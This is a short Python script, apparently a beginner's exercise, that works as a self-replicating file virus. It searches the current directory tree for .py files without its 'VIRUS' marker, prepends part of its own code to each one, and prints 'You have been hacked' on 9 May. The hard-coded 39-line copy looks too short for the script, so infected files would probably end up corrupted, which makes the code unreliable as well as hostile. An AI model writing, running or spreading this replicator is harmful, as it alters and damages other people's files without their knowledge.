#!/usr/bin/python3

# interacting with the oprating system
import os
import datetime

# glabal variable of some sort holding the string "VIRUS"
SIGNATURE = "VIRUS"

# starts a function to locate files to to infect and knows if its been infected by the signature it leaves behind
def locate(path):
    files_targeted = [] # list to hold targeted files
    filelist = os.listdir(path) # List files in the directory
    for fname in filelist:
      #asking if the item is a directory, recurse into it
        if os.path.isdir(path+"/"+fname):
          # asking if the file has been infected if not add it to the list
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
          #checking the files for a signature that the virus leavs behnind
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
              # if the file is not infected, add it to the list of targeted files     
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted 

# a function that runs the virus on every file
def infect(files_targeted):
    # exuctes the virus code
    virus = open(os.path.abspath(__file__))
    virusstring = ""  
    
    # read the first 39 lines of the virus script
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close()  # close virus script

    # rewriting file information to add the virus to files
    for fname in files_targeted:
        f = open(fname)  # open the file
        temp = f.read()  # read the file information
        f.close()  # close file
        # adding virus code to file
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()  # Close the file 
# 

def detonate():
    current_date = datetime.datetime.now()  # checking curent date
    # seeing if the date is 5/9
    if current_date.month == 5 and current_date.day == 9:
        print("You have been hacked")  # if it is true it will print


files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
